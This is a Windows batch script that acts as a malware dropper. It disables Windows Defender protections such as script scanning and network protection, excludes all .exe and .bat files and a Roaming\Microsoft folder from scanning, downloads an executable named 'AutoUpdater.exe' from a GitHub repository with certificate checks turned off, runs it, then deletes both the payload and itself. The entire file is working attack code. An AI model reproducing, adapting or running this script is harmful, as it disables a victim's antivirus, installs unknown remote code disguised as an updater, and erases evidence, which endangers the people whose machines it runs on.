@echo off
setlocal

:: Define the file name and URL
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"

:: Define the document path dynamically using USERPROFILE
set "docPath=%USERPROFILE%\AppData\Roaming\Microsoft"

:: Disable various Windows Defender features (use with extreme caution!)
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"

:: Exclude all .exe files in %USERPROFILE% from Windows Defender scanning
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"

:: Exclude all .exe files in %USERPROFILE% from Windows Defender scanning
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"

:: Exclude the AutoUpdater file dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%\%file%'"

:: Exclude the folder dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%'"

:: Download the file
curl -k -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start /wait "" "%file%"

:: Change the sample submission settings to send safe samples automatically
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"

:: Delete the file
del /q "%file%"

:: Attempt to delete this script
start /b "" cmd /c del "%~f0"&exit

endlocal
